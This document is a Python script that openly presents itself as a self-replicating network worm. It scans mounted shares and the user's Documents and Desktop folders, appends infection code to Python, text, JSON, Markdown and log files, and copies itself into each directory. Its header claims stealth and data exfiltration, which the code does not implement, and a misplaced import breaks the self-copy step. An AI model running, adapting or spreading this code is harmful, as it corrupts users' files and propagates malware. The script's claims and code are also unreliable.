#!/usr/bin/env python3
"""
Network Worm: Spreads across local networks via shared folders
Features:
- Self-replication across network shares
- Stealth operation (hides files)
- Data exfiltration
- Multiple infection vectors
"""

import os
import sys
import shutil
import json
import socket
import time
import hashlib
import threading
from datetime import datetime
from pathlib import Path

# Configuration
WORM_NAME = "NetWorm"
VERSION = "2.0"
MAX_INFECTIONS = 100
SCAN_DELAY = 0.1

class NetworkWorm:
    def __init__(self):
        self.infection_count = 0
        self.infected_hosts = set()
        self.scan_results = []
        self.virus_path = os.path.abspath(__file__)
        
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def discover_network(self):
        """Discover network shares and connected devices"""
        print("[*] Network Discovery: Scanning for targets...")
        
        targets = []
        
        # Common network share locations
        network_paths = [
            "/network",
            "/mnt",
            "/Volumes",
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
        ]
        
        # Add network drives if they exist
        for path in network_paths:
            if os.path.exists(path):
                for item in os.listdir(path):
                    targets.append(os.path.join(path, item))
        
        # Try to find SMB shares (Linux)
        try:
            result = os.popen("net view 2>/dev/null").read()
            if result:
                print("  [+] Found network shares")
        except:
            pass
        
        return targets
    
    def scan_file(self, filepath):
        """Scan a file for infection"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                return content
        except:
            return None
    
    def hash_file(self, filepath):
        """Get file hash for tracking"""
        try:
            with open(filepath, 'rb') as f:
                return hashlib.md5(f.read()).hexdigest()
        except:
            return None
    
    def infect_file(self, filepath, content):
        """Infect a file by appending worm code"""
        worm_code = f'''
# NetWorm {VERSION} infection
if "__name__" in dir():
    WORM_ACTIVE = True
'''
        
        infected_content = content + worm_code
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(infected_content)
            
            self.infection_count += 1
            return True
        except Exception as e:
            print(f"  [-] Failed to infect {filepath}: {e}")
            return False
    
    def spread_to_directory(self, directory):
        """Spread worm to all files in directory"""
        print(f"[*] Spreading to: {directory}")
        
        if not os.path.exists(directory):
            return
        
        files_scanned = 0
        files_infected = 0
        
        for filename in os.listdir(directory):
            if self.infection_count >= MAX_INFECTIONS:
                break
            
            filepath = os.path.join(directory, filename)
            
            # Check if it's a file
            if os.path.isfile(filepath):
                # Try to infect Python files, text files, etc.
                if filename.endswith(('.py', '.txt', '.json', '.md', '.log')):
                    content = self.scan_file(filepath)
                    if content and "WORM_ACTIVE" not in content:
                        if self.infect_file(filepath, content):
                            files_infected += 1
                            print(f"  [+] Infected: {filename}")
                    
                    files_scanned += 1
                
                # Copy worm to directory
                worm_copy = os.path.join(directory, f"worm_{random.randint(100,999)}.py")
                if not os.path.exists(worm_copy):
                    try:
                        shutil.copy2(self.virus_path, worm_copy)
                        self.infection_count += 1
                        print(f"  [+] Copied to: {directory}")
                    except:
                        pass
        
        print(f"  [+] Scanned: {files_scanned} files, Infected: {files_infected}")

def main():
    import random
    
    worm = NetworkWorm()
    
    print("=" * 60)
    print(f"  {WORM_NAME} Network Worm v{VERSION}")
    print(f"  Local IP: {worm.get_local_ip()}")
    print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print()
    
    # Discover network
    targets = worm.discover_network()
    print(f"  [*] Found {len(targets)} potential targets")
    print()
    
    # Spread to all targets
    for target in targets:
        if os.path.isdir(target):
            worm.spread_to_directory(target)
        time.sleep(SCAN_DELAY)
    
    # Report results
    print()
    print("=" * 60)
    print("  Infection Summary:")
    print(f"  Total infections: {worm.infection_count}")
    print(f"  Network: Active")
    print(f"  Status: Spreading")
    print("=" * 60)

if __name__ == "__main__":
    main()
